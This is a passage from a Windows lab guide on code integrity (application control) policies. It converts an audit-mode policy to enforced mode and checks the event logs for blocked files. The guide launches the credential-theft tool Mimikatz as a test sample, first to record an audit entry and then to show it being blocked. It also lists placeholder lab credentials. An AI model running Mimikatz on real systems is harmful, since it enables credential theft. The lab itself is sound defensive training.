Copy-item "C:\CI\Srv01-audit.bin" "C:\Windows\System32\CodeIntegrity\Sipolicy.p7b"  
```  
  
  
### Restart SRV01  
At the Windows PowerShell command prompt, type **restart-computer -force**.  
  
  
  
#### :calling: COMMAND  
```PowerShellWithUi  
restart-computer -force  
```  
  
  
### Sign in to SRV01  
Sign in to **SRV01** as **CONTOSO\LabAdmin** using **Passw0rd!** as the password.  
  
#### :bulb: KNOWLEDGE  
After restart, the machine is running with code integrity in audit mode. Any files not covered by the code integrity policy will be logged to the eventlog.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Open the Mimikatz folder  
Open File Explorer, and then navigate to **C:\LabFiles\mimikatz\x64**.  
  
  
  
#### :calling: COMMAND  
```Shell  
explorer.exe c:\LabFiles\mimikatz\x64  
```  
  
  
### Launch Mimikatz  
Double-click **mimikatz.exe**.  
  
#### :bulb: KNOWLEDGE  
You are launching Mimikatz to verify whether it will generate an entry in the code integrity audit log.  
  
  
  
  
### Close Mimkatz  
Close the Mimikatz window.  
  
  
  
  
### Install Notepad++ from the DC  
In File Explorer, navigate to **\\DC\C$\LabFiles\Ben**. Double-click**npp.EXE**. When prompted, click **Run**. Accept all installation defaults in the installation wizard. After installation, uncheck the option to **Run Notepad++**, and then click **Finish.** Close the Command Prompt window.  
  
#### :bulb: KNOWLEDGE  
Notepad++ (npp.exe) is being installed to show how a code integrity violation entry will be logged. Notepad++ is not blocked because the configuration is set to audit mode.  
  
  
  
#### :calling: COMMAND  
```ShellWithUi  
explorer \\DC\C$\LabFiles\Ben\npp.EXE  
```  
  
  
### Open Windows PowerShell  
On the taskbar, right-click **Windows PowerShell**, click **Run as Administrator**, and then click **Yes**.  
  
  
  
  
### View code integrity log entries  
At the Windows PowerShell command prompt, type the following command, and then press **ENTER**.   
**Get-WinEvent -Logname Microsoft-Windows-CodeIntegrity/Operational | where {$\_.ID -eq '3076'} | FL**  
  
#### :bulb: KNOWLEDGE  
The audit file reports that the files displayed in the output would be blocked in enforcement mode. You should see a number of entries regarding Notepad++ (npp.exe) and an entry regarding mimikatz.exe.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655203.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Get-WinEvent -Logname Microsoft-Windows-CodeIntegrity/Operational | where {$\_.ID -eq '3076'} | FL  
```  
  
  
### Create a code integrity XML policy-enforced file  
At the Windows PowerShell command prompt, type **Copy-item "C:\CI\Srv01-audit.xml" "C:\CI\Srv01-enforced.xml"**, and then press **ENTER**.  
  
  
  
#### :calling: COMMAND  
```TypeText  
Copy-item "C:\CI\Srv01-audit.xml" "C:\CI\Srv01-enforced.xml"  
```  
  
  
### Remove audit mode in the code integrity policy  
At the Windows PowerShell command prompt, type **Set-RuleOption -FilePath "C:\CI\Srv01-enforced.xml" -Option 3 -Delete**, and then press**ENTER.** Close all open Command Prompt windows.  
  
  
  
#### :calling: COMMAND  
```TypeText  
Set-RuleOption -FilePath "C:\CI\Srv01-enforced.xml" -Option 3 -Delete  
```  
  
  
### Convert the XML policy to binary format  
At the Windows PowerShell command prompt, type **ConvertFrom-CIPolicy "C:\CI\Srv01-enforced.xml" "C:\CI\Srv01-enforced.bin"**, and then press **ENTER**. This will take a few minutes to complete.  
  
  
  
#### :calling: COMMAND  
```TypeText  
ConvertFrom-CIPolicy "C:\CI\Srv01-enforced.xml" "C:\CI\Srv01-enforced.bin"  
```  
  
  
### Copy the binary policy file  
In Windows PowerShell, type **Copy-item "C:\CI\Srv01-enforced.bin" "C:\Windows\System32\CodeIntegrity\Sipolicy.p7b"**  
  
  
  
#### :calling: COMMAND  
```TypeText  
Copy-item "C:\CI\Srv01-enforced.bin" "C:\Windows\System32\CodeIntegrity\Sipolicy.p7b"  
```  
  
  
### Restart SRV01  
At the Windows PowerShell command prompt, type **restart-computer -force**, and then press **ENTER**.  
  
  
  
#### :calling: COMMAND  
```PowerShell  
restart-computer -force  
```  
  
  
### Sign in to SRV01  
Sign in to **SRV01** as **CONTOSO\Administrator** using**Passw0rd!** as the password.  
  
#### :bulb: KNOWLEDGE  
After restart, the machine is running with code integrity in enforcement mode. Any files not covered by the code integrity policy will not be loaded on the server.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Start the Notepad++ program  
On the Start menu, click **Notepad++**. Nothing happens because the application is not allowed to run—it is not whitelisted in the policy.  
  
  
  
  
### Open the mimikatz\x64 folder  
Open File Explorer, and then navigate to **C:\LabFiles\mimikatz\x64**.  
  
  
  
#### :calling: COMMAND  
```Shell  
explorer.exe C:\LabFiles\Mimikatz\x64  
```  
  
  
### Launch Mimkatz  
Double-click **mimikatz.exe**. The launch fails. Mimikatz was added to SRV01 after the code integrity audit policy was created for this exercise.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655206.PNG  
  
  
  
  
### Open Windows PowerShell  
On the taskbar, right-click **Windows PowerShell**, click **Run as Administrator**, and then click **Yes**.  
  
  
  
  
### View the CodeIntegrity log  
At the Windows PowerShell command prompt, type the following command, and then press **ENTER**.   
**Get-WinEvent -Logname Microsoft-Windows-CodeIntegrity/Operational | where {$\_.ID -eq '3077'} | FL**  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 653398.PNG  
>\* ShowAutomatically = Always  
  
  
  
#### :calling: COMMAND  
```TypeText  
Get-WinEvent -Logname Microsoft-Windows-CodeIntegrity/Operational | where {$\_.ID -eq '3077'} | FL  
```  
  
  
### End the lab  
Click **Done** to finalize and close the lab.  
  
  
  
  
  
